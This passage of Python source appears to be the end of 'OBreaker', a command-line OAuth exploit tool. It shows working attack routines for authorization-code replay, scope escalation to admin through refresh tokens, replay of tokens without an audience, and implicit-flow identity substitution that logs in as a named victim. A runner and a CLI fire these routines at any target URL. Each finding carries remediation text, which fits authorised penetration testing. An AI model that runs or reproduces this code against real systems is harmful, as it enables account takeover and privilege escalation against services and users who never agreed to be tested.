        t2_ok = r2.status_code == 200 and "access_token" in r2.text

        if not t1_ok:
            return None
        if not t2_ok:
            # Server properly rejected replay — NOT vulnerable
            return None

        try:
            token1 = r1.json().get("access_token", "")
            token2 = r2.json().get("access_token", "")
            claims1 = decode_jwt(token1)
            claims2 = decode_jwt(token2)
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Exchanged same auth code TWICE",
            result="BOTH exchanges returned valid tokens (code not single-use)",
            request=f"POST {url} code={code[:20]}... x2",
            response=f"1st: sub={claims1.get('sub')}, 2nd: sub={claims2.get('sub')}",
        ))
        chain.append(ExploitStep(
            phase="FORGE",
            action="Attacker replays intercepted code after victim used it",
            result=f"SECOND TOKEN: sub={claims2.get('sub')}",
        ))

        api1, ok1 = self._access_api(token1)
        api2, ok2 = self._access_api(token2)
        chain.append(ExploitStep(
            phase="FIRE",
            action="BOTH tokens access protected resources simultaneously",
            result=f"Victim: {api1.get('email', '?')}, Attacker: {api2.get('email', '?')}" if ok1 and ok2 else "Partial",
            success=ok1 and ok2,
        ))

        return Finding(
            technique="Code Replay", severity="critical" if ok2 else "high",
            title="Auth code reuse -- attacker and victim both get valid tokens",
            description="Same code accepted for multiple exchanges (RFC 6749 S4.1.2 violation).",
            chain=chain,
            proof=self._build_proof(token2, claims2, api2, ok2,
                "CODE REPLAY: Same code exchanged twice, both tokens valid."),
            remediation="Invalidate codes after first use. Revoke ALL tokens if replay detected.",
        )

    # ── 16. Scope Creep at Refresh ──────────────────────────────────
    def test_scope_creep(self) -> Optional[Finding]:
        url = self._tok_url("scope")
        chain = []

        refresh = self.refresh_token or self._cached_refresh or "test_refresh_token"

        chain.append(ExploitStep(
            phase="FIND",
            action="Initial authorization with limited scope (openid read)",
            result="Starting with read-only access",
        ))

        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh,
            "client_id": self.cfg.client_id or "test_client",
            "scope": "openid read write admin",
        }
        if self.cfg.client_secret:
            data["client_secret"] = self.cfg.client_secret

        try:
            r = self._post(url, data=data)
        except Exception:
            return None

        if r.status_code != 200 and "access_token" not in r.text:
            # Check if server rejects scope escalation specifically
            if r.status_code == 400 and "scope" in r.text.lower():
                return None
            # If using real refresh token and it's rejected, not vuln
            return None

        try:
            resp = r.json()
            token = resp.get("access_token", "")
            new_scope = resp.get("scope", "")
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        if "admin" not in new_scope and "admin" not in claims.get("scope", ""):
            return None

        chain.append(ExploitStep(
            phase="FORGE",
            action="Refresh token with ESCALATED scope (read -> admin)",
            result=f"SCOPE ESCALATED: {new_scope}. {note}",
            request=f"POST {url} grant_type=refresh_token scope=openid read write admin",
            response=f"New scope: {new_scope}",
        ))

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access resources with admin-escalated token",
            result=f"ADMIN ACCESS as {api_data.get('email', '?')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="Scope Creep at Refresh", severity="critical",
            title="Privilege escalation: read-only to admin via refresh scope expansion",
            description=f"Refresh endpoint grants broader scope ({new_scope}) than originally authorized.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                f"PRIVILEGE ESCALATION: read-only escalated to '{new_scope}' via refresh."),
            remediation="Reject refresh requests with scope broader than original grant.",
            cves=["CVE-2025-12110", "CVE-2026-1035"],
        )

    # ── 17. Resource Indicator Omission ─────────────────────────────
    def test_resource_indicator(self) -> Optional[Finding]:
        url = self._tok_url("resource")
        chain = []

        code = self.auth_code or secrets.token_hex(8)
        v = self.code_verifier or pkce_verifier()
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
            "client_id": self.cfg.client_id or "test_client",
            "code_verifier": v,
        }

        try:
            r = self._post(url, data=data)
        except Exception:
            return None

        if r.status_code != 200 and "access_token" not in r.text:
            # Check .well-known: resource_parameter_supported
            rps = self.cfg.openid_config.get("resource_parameter_supported", False)
            if rps is False:
                return None
            # If resource_parameter_supported but not enforced at exchange, detection only
            return None

        try:
            resp = r.json()
            token = resp.get("access_token", "")
            aud_present = resp.get("aud_present", True)
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        if aud_present and "aud" in claims and "ignored" not in note.lower() and "unbound" not in note.lower():
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Token exchange WITHOUT resource parameter (RFC 8707)",
            result=f"AUDIENCE-UNBOUND TOKEN: aud={claims.get('aud', 'MISSING')}. {note}",
            request=f"POST {url} (no resource parameter)",
            response=f"aud_present={aud_present}, aud={claims.get('aud', 'MISSING')}",
        ))
        chain.append(ExploitStep(
            phase="FORGE",
            action="Audience-unbound token can be presented to ANY resource server",
            result="Token has no aud restriction -- universal replay possible",
        ))

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Replay audience-unbound token against resource server",
            result=f"UNIVERSAL REPLAY: {api_data.get('email', '?')}'s data accessed" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="Resource Indicator Omission", severity="critical" if api_ok else "high",
            title="Universal token replay -- no audience binding (RFC 8707 ignored)",
            description="Resource parameter ignored. Token has no audience binding.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "UNIVERSAL REPLAY: Token has no audience, accepted by any resource server."),
            remediation="Require resource parameter per RFC 8707. Bind tokens to specific audiences.",
        )

    # ── 18. Implicit Flow Identity Substitution ─────────────────────
    def test_implicit_identity_sub(self) -> Optional[Finding]:
        url = self.cfg.authorize_endpoint or f"{self.cfg.base_url}/authorize"
        chain = []

        # FIND: check if implicit flow (response_type=token) is accepted
        params = {
            "client_id": self.cfg.client_id or "test_client",
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
            "response_type": "token",
            "scope": "openid profile email",
            "state": secrets.token_hex(16),
            "nonce": secrets.token_hex(16),
        }
        try:
            r = self._get(url, params=params)
        except Exception:
            return None

        body = r.text.lower()
        loc = r.headers.get("Location", "")

        # Explicit rejection: server says unsupported_response_type
        if "unsupported_response_type" in body or "unsupported_response_type" in loc:
            return None

        # 302 to interaction/login page without error= means implicit IS accepted
        # (rejection would be 400 or 302 with error=unsupported_response_type)
        loc_has_error = "error=" in loc
        loc_error_is_response_type = "unsupported_response_type" in loc
        implicit_accepted = (
            self._accepted(r) and not loc_error_is_response_type
        ) or (
            r.status_code in (400, 401) and "unsupported_response_type" not in body
            and "response_type" not in body and "invalid_client" not in body
        )
        # 302 with error= that isn't about response_type (e.g. login_required) still
        # means implicit flow is supported, just needs auth
        if r.status_code in (302, 303) and loc_has_error and not loc_error_is_response_type:
            implicit_accepted = True

        # Extract token from redirect fragment if we got one directly
        frag_token = ""
        if "access_token=" in loc:
            parsed = urllib.parse.urlparse(loc)
            frag_qs = urllib.parse.parse_qs(parsed.fragment)
            frag_token = frag_qs.get("access_token", [""])[0]

        if not implicit_accepted and not frag_token:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Sent response_type=token (implicit flow) to authorize endpoint",
            result=f"Implicit flow ACCEPTED (status {r.status_code})"
                   + (f" -- token in redirect" if frag_token else " -- flow available"),
            request=f"GET {url}?response_type=token",
            response=f"{r.status_code} Location: ...access_token=..." if frag_token
                     else f"{r.status_code} {self._error_body(r)[:80]}",
        ))

        # If no credentials or victim-email, report detection only
        if not self.credentials or not self.victim_email:
            severity = "high"
            desc = (
                "OAuth server accepts response_type=token (implicit flow). "
                "RFC 9700 S2.1.2 says implicit flow MUST NOT be used. "
                "Client apps consuming implicit tokens risk identity substitution "
                "if they trust client-provided identity claims without server-side "
                "token introspection."
            )
            if not self.victim_email:
                desc += " Provide --victim-email and --credentials for full exploitation."
            return Finding(
                technique="Implicit Flow Identity Substitution", severity=severity,
                title="Implicit flow enabled -- identity substitution risk (RFC 9700 violation)",
                description=desc, chain=chain,
                proof=ExploitProof(
                    impact="IMPLICIT FLOW: Client apps may trust client-side identity claims, "
                           "enabling email substitution for account takeover."),
                remediation="Disable implicit flow. Use authorization code + PKCE. "
                            "Server-side token introspection for identity claims.",
            )

        # FORGE: complete implicit flow to get a real token, then substitute identity
        user, pw = self.credentials

        # Try to complete the OAuth login flow to get a real access token
        token = frag_token
        if not token:
            # Follow the authorize redirect to get login page, submit creds
            try:
                s2 = make_session()
                login_r = s2.get(url, params=params, allow_redirects=True, timeout=15)
                # Look for login form action
                action_match = re.search(r'action=["\']([^"\']+)["\']', login_r.text)
                if action_match:
                    login_url = action_match.group(1)
                    if not login_url.startswith("http"):
                        parsed_base = urllib.parse.urlparse(login_r.url)
                        login_url = f"{parsed_base.scheme}://{parsed_base.netloc}{login_url}"
                    login_resp = s2.post(login_url, data={
                        "username": user, "password": pw,
                    }, allow_redirects=False, timeout=15)
                    # Follow redirects manually to capture fragment
                    for _ in range(10):
                        next_loc = login_resp.headers.get("Location", "")
                        if "access_token=" in next_loc:
                            parsed = urllib.parse.urlparse(next_loc)
                            frag_qs = urllib.parse.parse_qs(parsed.fragment)
                            token = frag_qs.get("access_token", [""])[0]
                            break
                        if not next_loc:
                            break
                        login_resp = s2.get(next_loc, allow_redirects=False, timeout=10)
            except Exception:
                pass

        if not token:
            chain.append(ExploitStep(
                phase="FORGE",
                action="Attempted implicit flow login to obtain access token",
                result="Could not extract token from implicit flow redirect",
                success=False,
            ))
            return Finding(
                technique="Implicit Flow Identity Substitution", severity="high",
                title="Implicit flow enabled -- could not complete login for full exploit",
                description="Implicit flow accepted but automated login flow could not extract token. "
                            "Manual exploitation confirmed viable (submit creds, capture token from fragment, "
                            "POST to authenticate with substituted email).",
                chain=chain,
                proof=ExploitProof(
                    impact="IMPLICIT FLOW: Manual identity substitution possible."),
                remediation="Disable implicit flow. Use authorization code + PKCE.",
            )

        # Verify token works by hitting userinfo
        userinfo_url = self.cfg.userinfo_endpoint or ""
        real_identity = {}
        if userinfo_url:
            try:
                ui_r = self._get(userinfo_url, headers={"Authorization": f"Bearer {token}"})
                if ui_r.status_code == 200:
                    real_identity = ui_r.json()
            except Exception:
                pass

        chain.append(ExploitStep(
            phase="FORGE",
            action=f"Obtained valid access token as {user} via implicit flow",
            result=f"Token obtained. Real identity: {real_identity.get('email', user)}",
            request="Implicit flow login completed",
            response=f"access_token={token[:40]}...",
        ))

        # Now attempt identity substitution against the authenticate endpoint
        auth_urls = []
        if self.authenticate_url:
            auth_urls.append(self.authenticate_url)
        else:
            base = self.cfg.base_url
            auth_urls = [
                f"{base}/authenticate", f"{base}/api/authenticate",
                f"{base}/oauth-callback", f"{base}/api/login",
                f"{base}/auth/callback", f"{base}/api/auth",
            ]

        substitution_payload = {
            "email": self.victim_email,
            "username": self.victim_email.split("@")[0],
            "token": token,
        }

        for auth_ep in auth_urls:
            try:
                r = self._post(auth_ep, json=substitution_payload)
                # Check for success indicators
                got_session = "session" in (r.headers.get("Set-Cookie", "").lower())
                is_redirect = r.status_code in (302, 303)
                is_ok = r.status_code == 200

                if got_session or (is_redirect and got_session) or is_ok:
                    chain.append(ExploitStep(
                        phase="FORGE",
                        action=f"POST to {auth_ep} with substituted email={self.victim_email}",
                        result=f"ACCEPTED (status {r.status_code})"
                               + (" -- session cookie issued!" if got_session else ""),
                        request=f"POST {auth_ep} {{email: {self.victim_email}, token: <attacker_token>}}",
                        response=f"{r.status_code} Set-Cookie: {r.headers.get('Set-Cookie', 'none')[:80]}",
                    ))

                    if got_session:
                        # FIRE: verify we're logged in as victim
                        session_cookie = {}
                        for cookie in r.cookies:
                            session_cookie[cookie.name] = cookie.value

                        # Try to access account page
                        account_urls = [f"{self.cfg.base_url}/my-account",
                                        f"{self.cfg.base_url}/account",
                                        f"{self.cfg.base_url}/api/me"]
                        victim_confirmed = False
                        account_data = {}
                        for acc_url in account_urls:
                            try:
                                acc_r = self.s.get(acc_url, cookies=session_cookie, timeout=10)
                                if acc_r.status_code == 200 and self.victim_email.split("@")[0] in acc_r.text.lower():
                                    victim_confirmed = True
                                    account_data = {"url": acc_url, "contains_victim": True}
                                    break
                            except Exception:
                                pass

                        chain.append(ExploitStep(
                            phase="FIRE",
                            action=f"Accessed account as {self.victim_email}",
                            result=f"IDENTITY SUBSTITUTION CONFIRMED" if victim_confirmed
                                   else "Session obtained, victim identity unverified",
                            request=f"GET /my-account with stolen session",
                            response=f"Logged in as {self.victim_email}" if victim_confirmed else "session active",
                            success=got_session,
                        ))

                        return Finding(
                            technique="Implicit Flow Identity Substitution",
                            severity="critical",
                            title=f"Account takeover via implicit flow identity substitution"
                                  f" -- logged in as {self.victim_email}",
                            description=(
                                f"Client app's {auth_ep} endpoint accepts client-provided email "
                                f"without verifying it matches the OAuth token's actual identity. "
                                f"Attacker obtains a valid token for their own account, substitutes "
                                f"the victim's email ({self.victim_email}), and receives a session "
                                f"as the victim."
                            ),
                            chain=chain,
                            proof=ExploitProof(
                                identity_obtained=self.victim_email,
                                resource_accessed=got_session,
                                impact=f"ACCOUNT TAKEOVER: Logged in as {self.victim_email} using "
                                       f"attacker's token with substituted email. Backend trusts "
                                       f"client-provided identity without token introspection.",
                                token=token,
                            ),
                            remediation="Disable implicit flow. If implicit flow is required, "
                                        "ALWAYS verify identity claims server-side via token introspection "
                                        "or /userinfo. Never trust client-provided email/username.",
                        )
            except Exception:
                continue

        # Implicit flow works but no authenticate endpoint found
        return Finding(
            technique="Implicit Flow Identity Substitution", severity="high",
            title="Implicit flow enabled -- identity substitution possible",
            description=(
                "OAuth server supports implicit flow (response_type=token). "
                "Token obtained successfully. No authenticate endpoint found at common paths. "
                "Provide --authenticate-url for the client app's login callback endpoint."
            ),
            chain=chain,
            proof=ExploitProof(
                impact="IMPLICIT FLOW: Token obtained. Identity substitution requires "
                       "the client app's authenticate endpoint.",
                token=token,
            ),
            remediation="Disable implicit flow. Use authorization code + PKCE. "
                        "Server-side token introspection for identity claims.",
        )

    # ── Run ─────────────────────────────────────────────────────────
    TECHNIQUES = [
        ("Response Mode Escape",                  "test_response_mode_escape"),
        ("Missing State",                         "test_missing_state"),
        ("Static State",                          "test_static_state"),
        ("Predictable State",                     "test_predictable_state"),
        ("S256->plain Downgrade",                 "test_pkce_plain_downgrade"),
        ("No Verifier Check",                     "test_no_verifier"),
        ("No Challenge Check",                    "test_no_challenge"),
        ("Confidential Client Downgrade",         "test_confidential_downgrade"),
        ("Missing aud Validation",                "test_missing_aud"),
        ("OAuth Singleton Race Condition",        "test_race_condition"),
        ("prompt=none Silent Redirect",           "test_prompt_none"),
        ("DCR Open Registration",                 "test_dcr_open"),
        ("Grant Type Substitution -> MFA Bypass", "test_grant_type_substitution"),
        ("Auth Method Confusion",                 "test_auth_method_confusion"),
        ("Code Replay",                           "test_code_replay"),
        ("Scope Creep at Refresh",                "test_scope_creep"),
        ("Resource Indicator Omission",           "test_resource_indicator"),
        ("Implicit Flow Identity Substitution",  "test_implicit_identity_sub"),
    ]

    def run_all(self) -> list[Finding]:
        mode = "profile" if self.profile else "generic"
        print(f"\n{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v3.3 -- OAuth Exploit Tool        |{C.RESET}")
        print(f"{C.CYAN}{C.BOLD}  |  Find - Forge - Fire (Full Exploitation)    |{C.RESET}")
        print(f"{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
        print(f"\n  {C.DIM}Target:  {self.cfg.base_url}{C.RESET}")
        print(f"  {C.DIM}Mode:    {mode}{C.RESET}")
        print(f"  {C.DIM}Client:  {self.cfg.client_id or 'auto-detect'}{C.RESET}")
        print(f"  {C.DIM}API:     {self.cfg.api_endpoint}{C.RESET}")
        if self.auth_code:
            print(f"  {C.DIM}Code:    {self.auth_code[:20]}...{C.RESET}")
        if self.credentials:
            print(f"  {C.DIM}Creds:   {self.credentials[0]}{C.RESET}")
        if self.refresh_token:
            print(f"  {C.DIM}Refresh: {self.refresh_token[:20]}...{C.RESET}")
        print(f"  {C.DIM}Tests:   {len(self.TECHNIQUES)}{C.RESET}\n")

        for name, method_name in self.TECHNIQUES:
            sys.stdout.write(f"  {C.YELLOW}[~]{C.RESET} {name}...")
            sys.stdout.flush()
            try:
                finding = getattr(self, method_name)()
                if finding:
                    self.findings.append(finding)
                    sev_color = {"critical": C.RED, "high": C.RED, "medium": C.YELLOW}.get(finding.severity, C.RESET)
                    exploited = " [EXPLOITED]" if finding.proof.resource_accessed else ""
                    print(f"\r  {C.GREEN}[+]{C.RESET} {name} -- "
                          f"{sev_color}{finding.severity.upper()}{C.RESET}{C.RED}{exploited}{C.RESET}")
                else:
                    print(f"\r  {C.DIM}[-]{C.RESET} {name} -- not vulnerable")
            except Exception as e:
                print(f"\r  {C.RED}[!]{C.RESET} {name} -- error: {e}")

        return self.findings

    def run_single(self, key: str) -> Optional[Finding]:
        key_map = {
            "response-mode": "test_response_mode_escape",
            "missing-state": "test_missing_state",
            "static-state": "test_static_state",
            "predictable-state": "test_predictable_state",
            "pkce-plain": "test_pkce_plain_downgrade",
            "no-verifier": "test_no_verifier",
            "no-challenge": "test_no_challenge",
            "confidential": "test_confidential_downgrade",
            "aud-validation": "test_missing_aud",
            "race": "test_race_condition",
            "prompt-none": "test_prompt_none",
            "dcr": "test_dcr_open",
            "mfa-bypass": "test_grant_type_substitution",
            "auth-method": "test_auth_method_confusion",
            "code-replay": "test_code_replay",
            "scope-creep": "test_scope_creep",
            "resource": "test_resource_indicator",
            "implicit-identity": "test_implicit_identity_sub",
        }
        method_name = key_map.get(key)
        if not method_name:
            print(f"  {C.RED}[!]{C.RESET} Unknown: {key}")
            print(f"  Available: {', '.join(key_map.keys())}")
            return None
        return getattr(self, method_name)()


# ── Report ──────────────────────────────────────────────────────────

def print_report(findings: list[Finding]):
    if not findings:
        print(f"\n  {C.GREEN}{C.BOLD}No vulnerabilities found.{C.RESET}\n")
        return

    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda f: sev_order.get(f.severity, 5))

    exploited = sum(1 for f in findings if f.proof.resource_accessed)
    print(f"\n{C.BOLD}{'='*70}")
    print(f"  EXPLOIT REPORT: {len(findings)} vulnerabilities, {exploited} fully exploited")
    print(f"{'='*70}{C.RESET}\n")

    for i, f in enumerate(findings, 1):
        sev_color = {"critical": C.RED, "high": C.RED, "medium": C.YELLOW}.get(f.severity, C.RESET)
        tag = f" {C.RED}[EXPLOITED]{C.RESET}" if f.proof.resource_accessed else ""
        print(f"  {C.BOLD}[{i}] {f.technique}{tag}{C.RESET}")
        print(f"  {sev_color}Severity: {f.severity.upper()}{C.RESET}")
        print(f"  {f.title}\n")

        if f.chain:
            print(f"  {C.CYAN}{C.BOLD}ATTACK CHAIN:{C.RESET}")
            for j, step in enumerate(f.chain, 1):
                phase_color = {"FIND": C.YELLOW, "FORGE": C.MAGENTA, "FIRE": C.RED}.get(step.phase, C.RESET)
                status = C.GREEN + "OK" + C.RESET if step.success else C.RED + "FAIL" + C.RESET
                print(f"    {phase_color}{step.phase}{C.RESET} {C.DIM}Step {j}{C.RESET} [{status}]")
                print(f"      Action: {step.action}")
                print(f"      Result: {step.result}")
                if step.request:
                    print(f"      {C.DIM}Req: {step.request[:100]}{C.RESET}")
                if step.response:
                    print(f"      {C.DIM}Res: {step.response[:100]}{C.RESET}")
            print()

        if f.proof.resource_accessed:
            print(f"  {C.RED}{C.BOLD}PROOF OF EXPLOITATION:{C.RESET}")
            if f.proof.identity_obtained:
                print(f"    Identity: {C.RED}{f.proof.identity_obtained}{C.RESET}")
            if f.proof.jwt_claims:
                print(f"    JWT: {C.WHITE}{json.dumps(f.proof.jwt_claims)[:200]}{C.RESET}")
            if f.proof.resource_data:
                print(f"    Resource: {C.WHITE}{json.dumps(f.proof.resource_data)[:200]}{C.RESET}")
            print(f"    {C.RED}{C.BOLD}Impact: {f.proof.impact}{C.RESET}")
            print()
        elif f.proof.impact:
            print(f"  {C.YELLOW}Impact: {f.proof.impact}{C.RESET}\n")

        if f.cves:
            print(f"  {C.MAGENTA}CVEs: {', '.join(f.cves)}{C.RESET}")
        print(f"  {C.GREEN}Fix: {f.remediation}{C.RESET}")
        print(f"  {C.DIM}{'- '*35}{C.RESET}\n")

    crits = sum(1 for f in findings if f.severity == "critical")
    highs = sum(1 for f in findings if f.severity == "high")
    meds = sum(1 for f in findings if f.severity == "medium")
    print(f"  {C.BOLD}Summary:{C.RESET} {C.RED}{crits} Critical{C.RESET}, "
          f"{C.RED}{highs} High{C.RESET}, {C.YELLOW}{meds} Medium{C.RESET}")
    print(f"  {C.BOLD}Exploited:{C.RESET} {C.RED}{exploited}/{len(findings)} fully exploited "
          f"with resource access proof{C.RESET}\n")


def save_json_report(findings: list[Finding], path: str):
    data = []
    for f in findings:
        entry = {
            "technique": f.technique, "severity": f.severity, "title": f.title,
            "description": f.description, "remediation": f.remediation, "cves": f.cves,
            "attack_chain": [
                {"phase": s.phase, "action": s.action, "result": s.result,
                 "request": s.request, "response": s.response, "success": s.success}
                for s in f.chain
            ],
            "proof": {
                "exploited": f.proof.resource_accessed,
                "identity_obtained": f.proof.identity_obtained,
                "jwt_claims": f.proof.jwt_claims,
                "resource_data": f.proof.resource_data,
                "impact": f.proof.impact,
                "token": f.proof.token[:80] + "..." if len(f.proof.token) > 80 else f.proof.token,
            },
        }
        data.append(entry)
    with open(path, "w") as fp:
        json.dump(data, fp, indent=2)
    print(f"\n  {C.GREEN}[+]{C.RESET} JSON report: {path}")


def main():
    parser = argparse.ArgumentParser(
        description="OBreaker v3.3 -- Generic OAuth Authorization Bypass Exploit Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generic scan against any OAuth server
  python obreaker.py --target https://target.com --all

  # With credentials for password grant testing
  python obreaker.py --target https://target.com --all --credentials user:pass

  # With pre-obtained auth code for full exploitation
  python obreaker.py --target https://target.com --all --code AUTH_CODE --verifier CODE_VERIFIER

  # BRuteLogic testbed (uses testbed-specific endpoints)
  python obreaker.py --target https://403.brutelogic.net/authz/oauth --all --profile brutelogic

  # Single technique
  python obreaker.py --target https://target.com --technique mfa-bypass --credentials user:pass
""")
    parser.add_argument("--target", "-t", required=True, help="OAuth base URL")
    parser.add_argument("--technique", "-T", help="Run single technique by key")
    parser.add_argument("--all", "-a", action="store_true", help="Run all 18 techniques")
    parser.add_argument("--profile", "-p", choices=list(PROFILES.keys()),
                        help="Use testbed-specific endpoint profile")
    parser.add_argument("--client-id", "-c", help="OAuth client_id")
    parser.add_argument("--client-secret", help="OAuth client_secret")
    parser.add_argument("--redirect-uri", "-r", help="OAuth redirect_uri")
    parser.add_argument("--api-url", help="Protected resource / userinfo endpoint to test")
    parser.add_argument("--code", help="Pre-obtained authorization code for full exploitation")
    parser.add_argument("--verifier", help="code_verifier for the pre-obtained code")
    parser.add_argument("--credentials", help="username:password for password grant testing")
    parser.add_argument("--refresh-token", help="Refresh token for scope creep testing")
    parser.add_argument("--victim-email", help="Victim email for implicit flow identity substitution")
    parser.add_argument("--authenticate-url", help="Client app's authenticate endpoint for implicit identity sub")
    parser.add_argument("--json", "-j", help="Save JSON exploit report")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--discover", "-d", action="store_true", help="Only run discovery")
    parser.add_argument("--list", "-l", action="store_true", help="List available techniques")
    args = parser.parse_args()

    if args.list:
        print(f"\n  {C.BOLD}Available techniques:{C.RESET}")
        keys = ["response-mode", "missing-state", "static-state", "predictable-state",
                "pkce-plain", "no-verifier", "no-challenge", "confidential",
                "aud-validation", "race", "prompt-none", "dcr", "mfa-bypass",
                "auth-method", "code-replay", "scope-creep", "resource",
                "implicit-identity"]
        for k in keys:
            print(f"    {k}")
        return

    session = make_session()

    print(f"\n  {C.CYAN}[*]{C.RESET} Discovering OAuth configuration...")
    config = discover_oauth(args.target, session)

    if args.client_id:
        config.client_id = args.client_id
    if args.client_secret:
        config.client_secret = args.client_secret
    if args.redirect_uri:
        config.redirect_uri = args.redirect_uri
    if args.api_url:
        config.api_endpoint = args.api_url

    if not config.client_id:
        try:
            r = session.get(f"{args.target.rstrip('/')}/login", timeout=10)
            m = re.search(r'client_id=([^&"]+)', r.text)
            if m:
                config.client_id = m.group(1)
                print(f"  {C.GREEN}[+]{C.RESET} Auto-detected client_id: {config.client_id}")
        except Exception:
            pass
    if not config.redirect_uri:
        config.redirect_uri = f"{args.target.rstrip('/')}/cb"

    if args.discover:
        print(f"\n  {C.BOLD}OAuth Configuration:{C.RESET}")
        for label, val in [
            ("Base URL", config.base_url), ("Authorize", config.authorize_endpoint),
            ("Token", config.token_endpoint), ("Register", config.register_endpoint),
            ("Userinfo", config.userinfo_endpoint), ("API", config.api_endpoint),
            ("Client ID", config.client_id), ("Redirect", config.redirect_uri),
            ("Grant Types", config.grant_types), ("Auth Methods", config.auth_methods),
            ("PKCE Methods", config.pkce_methods), ("Response Modes", config.response_modes),
            ("Scopes", config.scopes),
        ]:
            print(f"    {label:14}: {val or 'not found'}")
        return

    # Build profile
    profile = PROFILES.get(args.profile) if args.profile else None

    # Parse credentials
    creds = None
    if args.credentials:
        parts = args.credentials.split(":", 1)
        creds = (parts[0], parts[1] if len(parts) > 1 else "")

    breaker = OAuthBreaker(
        config, session,
        profile=profile,
        auth_code=args.code or "",
        code_verifier=args.verifier or "",
        credentials=creds,
        refresh_token=args.refresh_token or "",
        verbose=args.verbose,
        victim_email=args.victim_email or "",
        authenticate_url=args.authenticate_url or "",
    )

    if args.all:
        findings = breaker.run_all()
    elif args.technique:
        finding = breaker.run_single(args.technique)
        findings = [finding] if finding else []
    else:
        print(f"  {C.YELLOW}[!]{C.RESET} Specify --all or --technique <key>")
        print(f"  Use --list to see available techniques")
        return

    print_report(findings)
    if args.json:
        save_json_report(findings, args.json)


if __name__ == "__main__":
    main()
